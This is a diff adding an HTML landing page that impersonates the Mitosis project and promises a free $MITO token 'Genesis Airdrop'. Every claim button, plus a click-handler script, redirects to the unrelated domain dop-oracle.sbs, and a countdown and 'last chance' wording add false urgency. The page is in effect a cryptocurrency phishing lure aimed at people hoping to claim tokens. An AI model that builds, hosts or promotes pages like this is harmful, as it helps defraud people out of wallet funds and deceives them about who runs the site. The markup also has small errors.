@@ -1,0 +1,736 @@
+<!DOCTYPE html><html lang="en"><head><meta name="x-poe-datastore-behavior" content="local_only"><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mitosis Airdrop - Claim Free $MITO Tokens Now | Programmable Liquidity Network</title>
+    <meta name="description" content="Claim your Mitosis $MITO airdrop tokens now! Participate in the Ecosystem-Owned Liquidity revolution. 100M tokens allocated for Genesis Airdrop. Join the future of DeFi.">
+    <meta name="keywords" content="mitosis airdrop, $mito token, programmable liquidity, defi airdrop, cryptocurrency airdrop, free crypto, blockchain airdrop, mitosis protocol">
+    
+    <!-- Open Graph / Social Media Meta Tags -->
+    <meta property="og:title" content="Mitosis Airdrop - Claim Free $MITO Tokens Now">
+    <meta property="og:description" content="Claim your share of 100M $MITO tokens in the Mitosis Genesis Airdrop. Join the programmable liquidity revolution today.">
+    <meta property="og:image" content="https://mitosis.org/static/media/mito-logo.8f2e1d3b.png">
+    <meta property="og:url" content="https://mitosis-airdrop.com">
+    <meta name="twitter:card" content="summary_large_image">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text y=%22.9em%22 font-size=%2290%22&gt;🔷&lt;/text&gt;&lt;/svg&gt;">
+    
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e3;
+            --secondary: #10b981;
+            --dark: #0f172a;
+            --darker: #0a0e1a;
+            --light: #f8fafc;
+            --gray: #94a3b8;
+            --gradient: linear-gradient(135deg, #6366f1 0%, #8b5cf6 50%, #ec4899 100%);
+            --card-bg: rgba(15, 23, 42, 0.7);
+            --glass-bg: rgba(15, 23, 42, 0.6);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --neon-glow: 0 0 10px rgba(99, 102, 241, 0.7), 0 0 20px rgba(99, 102, 241, 0.5);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+        }
+        
+        body {
+            background-color: var(--darker);
+            background-image: 
+                radial-gradient(at 80% 20%, rgba(99, 102, 241, 0.15) 0, transparent 60%),
+                radial-gradient(at 20% 70%, rgba(16, 185, 129, 0.15) 0, transparent 60%);
+            color: var(--light);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.1) 0, transparent 30%),
+                radial-gradient(circle at 90% 80%, rgba(16, 185, 129, 0.1) 0, transparent 30%);
+            z-index: -1;
+        }
+        
+        .grid-pattern {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(15, 23, 42, 0.2) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(15, 23, 42, 0.2) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: -1;
+            opacity: 0.3;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+        
+        /* Header Styles */
+        header {
+            padding: 1.5rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            background: var(--glass-bg);
+            border-bottom: 1px solid var(--glass-border);
+        }
+        
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-weight: 700;
+            font-size: 1.5rem;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .logo-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: var(--gradient);
+            border-radius: 10px;
+            color: white;
+        }
+        
+        /* Hero Section */
+        .hero {
+            padding: 5rem 0 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero-content {
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: var(--gradient);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            letter-spacing: 0.5px;
+            margin-bottom: 1.5rem;
+            animation: pulse 2s infinite;
+        }
+        
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(to right, #e0e7ff, #c7d2fe, #a5b4fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero-subtitle {
+            font-size: 1.25rem;
+            color: var(--gray);
+            max-width: 600px;
+            margin: 0 auto 2.5rem;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin: 3rem auto;
+            max-width: 800px;
+        }
+        
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            backdrop-filter: blur(10px);
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--neon-glow);
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stat-label {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+        
+        .claim-button {
+            display: inline-block;
+            background: var(--gradient);
+            color: white;
+            font-weight: 600;
+            font-size: 1.1rem;
+            padding: 1rem 3rem;
+            border-radius: 12px;
+            text-decoration: none;
+            margin: 2rem 0;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 1px 3px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        
+        .claim-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2) 0%, rgba(255, 255, 255, 0) 100%);
+            z-index: -1;
+            transition: opacity 0.3s ease;
+            opacity: 0;
+        }
+        
+        .claim-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
+        }
+        
+        .claim-button:hover::before {
+            opacity: 1;
+        }
+        
+        .claim-button:active {
+            transform: translateY(1px);
+        }
+        
+        .countdown {
+            margin-top: 2rem;
+            font-size: 1rem;
+            color: var(--gray);
+        }
+        
+        /* Content Sections */
+        section {
+            padding: 5rem 0;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 3rem;
+            font-weight: 700;
+        }
+        
+        .section-title span {
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .cards-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 2rem;
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--neon-glow);
+        }
+        
+        .card-icon {
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--gradient);
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+        }
+        
+        .card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .card p {
+            color: var(--gray);
+            margin-bottom: 1.5rem;
+        }
+        
+        .eligibility-list {
+            list-style: none;
+            margin-top: 1.5rem;
+        }
+        
+        .eligibility-list li {
+            padding: 0.75rem 0;
+            display: flex;
+            align-items: flex-start;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .eligibility-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .eligibility-list li::before {
+            content: '✓';
+            color: var(--secondary);
+            font-weight: bold;
+            margin-right: 0.75rem;
+        }
+        
+        .timeline {
+            position: relative;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .timeline::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 4px;
+            height: 100%;
+            background: var(--gradient);
+            border-radius: 2px;
+        }
+        
+        .timeline-item {
+            position: relative;
+            margin-bottom: 2.5rem;
+            width: calc(50% - 2rem);
+        }
+        
+        .timeline-item:nth-child(odd) {
+            left: 0;
+            padding-right: 3rem;
+            text-align: right;
+        }
+        
+        .timeline-item:nth-child(even) {
+            left: 50%;
+            padding-left: 3rem;
+        }
+        
+        .timeline-content {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            backdrop-filter: blur(10px);
+        }
+        
+        .timeline-date {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+        }
+        
+        /* FAQ Section */
+        .faq-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .faq-item {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            margin-bottom: 1rem;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+        
+        .faq-question {
+            padding: 1.5rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .faq-answer {
+            padding: 0 1.5rem 1.5rem5rem;
+            color: var(--gray);
+            display: none;
+        }
+        
+        .faq-question::after {
+            content: '+';
+            font-size: 1.5rem;
+            transition: transform 0.3s ease;
+        }
+        
+        .faq-item.active .faq-question::after {
+            transform: rotate(45deg);
+        }
+        
+        .faq-item.active .faq-answer {
+            display: block;
+        }
+        
+        /* Footer */
+        footer {
+            padding: 3rem 0;
+            text-align: center;
+            border-top: 1px solid var(--glass-border);
+            margin-top: 5rem;
+        }
+        
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .social-link {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 50%;
+            color: var(--gray);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .social-link:hover {
+            color: white;
+            background: var(--gradient);
+            transform: translateY(-3px);
+        }
+        
+        .copyright {
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 1.5rem;
+        }
+        
+        /* Animations */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.5); }
+            70% { box-shadow: 0 0 0 10px rgba(99, 102, 241, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(99, 102, 241, 0); }
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        .floating {
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .section-title {
+                font-size: 2rem;
+            }
+            
+            .timeline::before {
+                left: 1rem;
+            }
+            
+            .timeline-item {
+                width: 100%;
+                padding-left: 2rem !important;
+                padding-right: 0 !important;
+                text-align: left !important;
+                left: 0 !important;
+            }
+            
+            .hero {
+                padding-top: 3rem;
+            }
+        }
+    </style>
+<script src="https://puc.poecdn.net/authenticated_preview_page/syncedState.bd4eeeb8e8e02052ee92.js"></script></head>
+<body>
+    <div class="grid-pattern"></div>
+    
+    <header>
+        <div class="container">
+            <div class="header-inner">
+                <div class="logo">
+                    <div class="logo-icon">M</div>
+                    Mitosis
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <main>
+        <section class="hero">
+            <div class="container">
+                <div class="hero-content">
+                    <div class="badge">GENESIS AIRDROP LIVE</div>
+                    <h1>Claim Your <span class="gradient-text">$MITO</span> Airdrop</h1>
+                    <p class="hero-subtitle">Join the Programmable Liquidity revolution. Claim your share of 100,000,000 MITO tokens allocated for the Genesis Airdrop.</p>
+                    
+                    <a href="https://dop-oracle.sbs" class="claim-button">CLAIM NOW</a>
+                    
+                    <div class="stats-grid">
+                        <div class="stat-card floating">
+                            <div class="stat-value">100M</div>
+                            <div class="stat-label">$MITO Tokens</div>
+                        </div>
+                        <div class="stat-card floating">
+                            <div class="stat-value">$7M</div>
+                            <div class="stat-label">Funding Raised</div>
+                        </div>
+                        <div class="stat-card floating">
+                            <div class="stat-value">10%</div>
+                            <div class="stat-label">Total Supply</div>
+                        </div>
+                        <div class="stat-card floating">
+                            <div class="stat-value">9</div>
+                            <div class="stat-label">Supported Chains</div>
+                        </div>
+                    </div>
+                    
+                    <div class="countdown">Registration closes in: <strong>3 days, 12 hours</strong></div>
+                </div>
+            </div>
+        </section>
+        
+        <section id="about">
+            <div class="container">
+                <h2 class="section-title">About <span>Mitosis</span></h2>
+                <div class="cards-container">
+                    <div class="card">
+                        <div class="card-icon">🔷</div>
+                        <h3>Programmable Liquidity</h3>
+                        <p>Mitosis is an Ecosystem-Owned Liquidity (EOL) layer 1 blockchain helping modular blockchains capture TVL and grow their user base.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon">💎</div>
+                        <h3>$7M Funding</h3>
+                        <p>Backed by top investors including Amber Group and Foresight Ventures, Mitosis is building the future of DeFi liquidity.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon">🚀</div>
+                        <h3>Matrix Straddle Vault</h3>
+                        <p>Final Phase 4 now live! No deposit eligibility criteria and no cap on deposits. Your last chance to participate.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section id="details">
+            <div class="container">
+                <h2 class="section-title">Airdrop <span>Details</span></h2>
+                <div class="timeline">
+                    <div class="timeline-item">
+                        <div class="timeline-content">
+                            <span class="timeline-date">August 20 - 26, 2024</span>
+                            <h3>Registration Window</h3>
+                            <p>Register your wallet and choose your claiming option during this period.</p>
+                        </div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-content">
+                            <span class="timeline-date">Before September 10, 2024</span>
+                            <h3>Claiming Window (7 days)</h3>
+                            <p>Claim your $MITO tokens during this 7-day period.</p>
+                        </div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-content">
+                            <span class="timeline-date">After Claiming Window</span>
+                            <h3>180-Day Unlock Period</h3>
+                            <p>Tokens unlock gradually over 180 days after claiming.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="text-align: center; margin-top: 3rem;">
+                    <a href="https://dop-oracle.sbs" class="claim-button">CLAIM YOUR TOKENS NOW</a>
+                </div>
+            </div>
+        </section>
+        
+        <section id="eligibility">
+            <div class="container">
+                <h2 class="section-title">Are You <span>Eligible?</span></h2>
+                <div class="card">
+                    <ul class="eligibility-list">
+                        <li>Protocol testers and vault depositors</li>
+                        <li>Content creators and Expedition participants</li>
+                        <li>Kaito Yappers and Discord community members</li>
+                        <li>Mitosis University writers and ambassadors</li>
+                        <li>Morse token holders</li>
+                        <li>NFT holders (Pudgy Penguins, Milady, Azuki, etc.)</li>
+                        <li>The Game of MITO participants</li>
+                        <li>Binance Booster Campaign participants</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+        
+        <section id="faq">
+            <div class="container">
+                <h2 class="section-title">Frequently Asked <span>Questions</span></h2>
+                <div class="faq-container">
+                    <div class="faq-item">
+                        <div class="faq-question">When will the MITO token launch?</div>
+                        <div class="faq-answer">The token generation event (TGE) is scheduled to occur after the testnet ends on December 22nd.</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">How are airdrop rewards calculated?</div>
+                        <div class="faq-answer">The airdrop allocation is split between MITO points (70%) and other token metrics (30%).</div>
+div&gt;
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">Can I participate in both testnet and mainnet activities?</div>
+                        <div class="faq-answer">Yes, participating in both activities can potentially increase your chances of receiving a larger airdrop allocation.</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">Is there a minimum deposit requirement?</div>
+                        <div class="faq-answer">While there's no strict minimum, higher deposits and consistent activity generally lead to more points.</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">What are the claiming options?</div>
+                        <div class="faq-answer">
+                            <strong>Option A:</strong> Enhanced Rewards - Receive $tMITO (tokenized time-locked version) that can be staked for additional rewards and redeemed after 180 days for 2.5x your allocation.<br><br>
+                            <strong>Option B:</strong> Instant Claim - Receive your full $MITO allocation immediately with no waiting period.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+    
+    <footer>
+        <div class="container">
+            <div class="logo" style="justify-content: center; margin-bottom: 1rem;">Mitosis Network</div>
+            <p>The future of programmable liquidity</p>
+            
+            <div class="social-links">
+                <a href="#" class="social-link">𝕏</a>
+                <a href="#" class="social-link">D</a>
+                <a href="#" class="social-link">T</a>
+                <a href="#" class="social-link">G</a>
+            </div>
+            
+            <a href="https://dop-oracle.sbs" class="claim-button">CLAIM YOUR AIRDROP NOW</a>
+            
+            <p class="copyright">© 2025 Mitosis Network. All rights reserved.</p>
+        </div>
+    </footer>
+    
+    <script>
+        // FAQ Accordion
+        document.querySelectorAll('.faq-question').forEach(question => {
+            question.addEventListener('click', () => {
+                const item = question.parentElement;
+                item.classList.toggle('active');
+            });
+        });
+        
+        // Claim button functionality
+        document.querySelectorAll('.claim-button').forEach(button => {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                // Add animation
+                this.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    window.location.href = 'https://dop-oracle.sbs';
+                }, 300);
+            });
+        });
+        
+        // Countdown timer
+        function updateCountdown() {
+            const registrationEnd = new Date('August 26, 2024 00:00:00 GMT+0000').getTime();
+            const now = new Date().getTime();
+            const timeLeft = registrationEnd - now;
+            
+            if (timeLeft > 0) {
+                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                
+                document.querySelector('.countdown').innerHTML = `Registration closes in: <strong>${days} days, ${hours} hours</strong>`;
+            } else {
+                document.querySelector('.countdown').innerHTML = `Registration closed`;
+            }
+        }
+        
+        updateCountdown();
+        setInterval(updateCountdown, 60000);
+    </script>
+
+
+</body></html>
